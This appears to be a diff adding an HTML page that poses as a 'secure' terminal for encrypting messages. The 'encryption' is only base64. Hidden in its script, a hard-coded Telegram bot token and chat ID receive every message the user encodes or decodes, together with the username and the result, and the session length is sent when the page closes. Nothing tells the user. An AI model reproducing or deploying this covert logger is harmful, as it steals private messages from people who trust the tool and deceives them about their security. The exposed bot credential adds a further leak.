@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>SECURE_CORE_TERMINAL</title>
+    <style>
+        body, html { margin: 0; padding: 0; height: 100%; font-family: 'Courier New', monospace; color: #00ff41; background: #000; overflow: hidden; }
+        #terminal-bg { position: fixed; inset: 0; background: radial-gradient(circle, #051a05 0%, #000 100%); z-index: -1; }
+        canvas { position: fixed; top: 0; left: 0; z-index: 0; pointer-events: none; }
+        .layer { position: fixed; inset: 0; display: flex; align-items: center; justify-content: center; z-index: 10; }
+        .panel { width: 350px; padding: 30px; border: 1px solid #00ff41; background: rgba(0, 10, 0, 0.95); text-align: center; box-shadow: 0 0 20px rgba(0, 255, 65, 0.2); }
+        .btn { padding: 12px; border: 1px solid #00ff41; background: transparent; color: #00ff41; cursor: pointer; width: 100%; margin-top: 10px; font-weight: bold; }
+        .btn:hover { background: #00ff41; color: #000; }
+        input, textarea { width: 100%; background: #000; color: #00ff41; border: 1px solid #00ff41; padding: 10px; margin: 10px 0; box-sizing: border-box; }
+        .hidden { display: none; }
+        #timer-display { position: absolute; top: 10px; left: 10px; font-size: 18px; z-index: 20; color: #fff; }
+    </style>
+</head>
+<body>
+
+    <div id="timer-display" class="hidden">TIME: 00:00</div>
+    <div id="terminal-bg"></div>
+    <canvas id="matrix"></canvas>
+
+    <div id="name-ui" class="layer">
+        <div class="panel">
+            <h3>[ OPERATOR_ID ]</h3>
+            <input type="text" id="username" placeholder="NAME" onkeypress="if(event.key==='Enter') saveName()">
+            <button class="btn" onclick="saveName()">[ ACCESS ]</button>
+        </div>
+    </div>
+
+    <div id="pin-ui" class="layer hidden">
+        <div class="panel">
+            <h3>[ PIN_AUTH ]</h3>
+            <input type="password" id="pin-input" maxlength="4" placeholder="PIN" onkeypress="if(event.key==='Enter') checkPin()">
+            <button class="btn" onclick="checkPin()">[ CONFIRM ]</button>
+        </div>
+    </div>
+
+    <div id="main-ui" class="layer hidden">
+        <div class="panel">
+            <h3>[ CORE_ENCRYPTION ]</h3>
+            <textarea id="msg" placeholder="TYPE_MESSAGE..."></textarea>
+            <button class="btn" onclick="proc('encode')">[ ENCODE ]</button>
+            <button class="btn" onclick="proc('decode')">[ DECODE ]</button>
+            <div id="out" style="border:1px dashed #00ff41; padding:10px; margin:10px 0; word-break: break-all;">OUTPUT</div>
+            <button class="btn" onclick="copyOut()">[ COPY_BUFFER ]</button>
+        </div>
+    </div>
+
+<script>
+    let username = "", startTime, timerInterval;
+    const BOT_TOKEN = "8047864259:AAHEokK5sjq1jJFuIq_e94sPIeTM2OlsqSs";
+    const CHAT_ID = "7938556654";
+
+    const c = document.getElementById('matrix'), ctx = c.getContext('2d');
+    c.width = window.innerWidth; c.height = window.innerHeight;
+    const chars = "0101010101ABCDEF";
+    let drops = Array(Math.floor(c.width/20)).fill(1);
+    function draw() { ctx.fillStyle = 'rgba(0,0,0,0.05)'; ctx.fillRect(0,0,c.width,c.height); ctx.fillStyle = '#00ff41'; ctx.font = '15px monospace'; drops.forEach((y, i) => { ctx.fillText(chars[Math.floor(Math.random()*chars.length)], i*20, y*20); if(y*20 > c.height) drops[i] = 0; drops[i]++; }); } setInterval(draw, 60);
+
+    function log(msg) { fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`); }
+
+    function saveName() { username = document.getElementById('username').value; if(username) { document.getElementById('name-ui').classList.add('hidden'); document.getElementById('pin-ui').classList.remove('hidden'); document.getElementById('pin-input').focus(); } }
+    
+    function checkPin() { 
+        if(document.getElementById('pin-input').value === "0000") { 
+            document.getElementById('pin-ui').classList.add('hidden'); 
+            document.getElementById('main-ui').classList.remove('hidden'); 
+            document.getElementById('timer-display').classList.remove('hidden');
+            startTimer(); 
+        } else { alert("WRONG PIN"); document.getElementById('pin-input').value = ""; } 
+    }
+
+    function startTimer() {
+        startTime = Date.now();
+        timerInterval = setInterval(() => {
+            let elapsed = Math.floor((Date.now() - startTime) / 1000);
+            let m = Math.floor(elapsed / 60), s = elapsed % 60;
+            document.getElementById('timer-display').innerText = `TIME: ${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
+        }, 1000);
+    }
+
+    window.onbeforeunload = () => {
+        let elapsed = Math.floor((Date.now() - startTime) / 1000);
+        let m = Math.floor(elapsed / 60), s = elapsed % 60;
+        log(`SESSION ENDED\nOperator: ${username}\nDuration: ${m}m ${s}s`);
+    };
+
+    function proc(mode) {
+        let val = document.getElementById('msg').value;
+        try { 
+            let res = (mode === 'encode') ? btoa(val) : atob(val); 
+            document.getElementById('out').innerText = res; 
+            let logMsg = (mode === 'encode') ? `ENCRYPTED_ON: ${val}\nRESULT: ${res}\nUser: ${username}` : `DECRYPTED: ${val}\nRESULT: ${res}\nUser: ${username}`;
+            log(logMsg); 
+        } catch(e) { alert("DATA CORRUPTION"); }
+    }
+
+    function copyOut() {
+        const text = document.getElementById('out').innerText;
+        if(text === "OUTPUT" || !text) return;
+        const textArea = document.createElement("textarea");
+        textArea.value = text;
+        document.body.appendChild(textArea);
+        textArea.select();
+        document.execCommand("copy");
+        document.body.removeChild(textArea);
+        alert("COPIED!");
+    }
+</script>
+</body>
+</html>
